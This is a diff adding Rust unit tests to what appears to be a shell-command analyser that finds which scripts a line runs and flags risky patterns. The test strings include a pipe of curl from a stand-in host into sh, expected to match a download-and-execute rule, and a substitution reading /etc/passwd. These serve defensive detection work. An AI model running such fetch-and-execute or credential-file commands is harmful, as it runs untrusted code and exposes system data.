@@ -355,6 +355,12 @@ fn a_program_after_a_variable_given_by_a_command_is_still_run() {
         "sudo x=$(date) sh i.sh",
         "timeout 5 x=$(date) sh i.sh",
         "PATH=$(pwd)/bin:$PATH sh i.sh",
+        // The substitution takes several words before it closes.
+        "TMP=$(mktemp -d) sh i.sh",
+        "x=$(id -u) y=$(id -g) ./i.sh",
+        "x=$(date +%s) sh i.sh",
+        "x=$( date ) sh i.sh",
+        "x=`date -u` bash i.sh",
         // Wrappers inside the substitution are read past as anywhere.
         "x=$(sudo sh i.sh)",
         "x=$(env FOO=1 sh i.sh)",
@@ -380,6 +386,27 @@ fn a_program_after_a_variable_given_by_a_command_is_still_run() {
             "{line}"
         );
     }
+    assert!(
+        rules_for("curl https://x.example/a | x=$(id -u) sh").contains(&RuleId::DownloadAndExecute)
+    );
+    // `$(<file)` reads the file; it is not run.
+    for line in [
+        "x=$(<./i.sh)",
+        "x=\"$(<./i.sh)\"",
+        "x=`<./i.sh`",
+        "ver=\"$(<\"$srcdir/i.sh\")\"",
+    ] {
+        assert!(!runs_file(line, "i.sh"), "{line}");
+        assert!(run_targets(line).is_empty(), "{line}");
+    }
+    // The command ends where its word does.
+    assert_eq!(run_targets("x=$(./i.sh;)"), ["i.sh"]);
+    assert_eq!(run_targets("x=$(./i.sh|cat)"), ["i.sh"]);
+    assert_eq!(run_targets("x=$(./i.sh>/dev/null)"), ["i.sh"]);
+    assert!(run_targets("x=\"$(cat i.sh 2>/dev/null || true)\"").is_empty());
+    // A line of nothing but openings is read once.
+    assert!(run_targets(&"x=$(".repeat(200_000)).is_empty());
+    assert!(run_targets(&"x=$(a ".repeat(100_000)).is_empty());
     // A value that is a whole command names one program, not its words.
     assert!(run_targets("x=\"$(cat /etc/passwd)\"").is_empty());
     assert!(run_targets("PATH=$(pwd)/bin:$PATH make").is_empty());
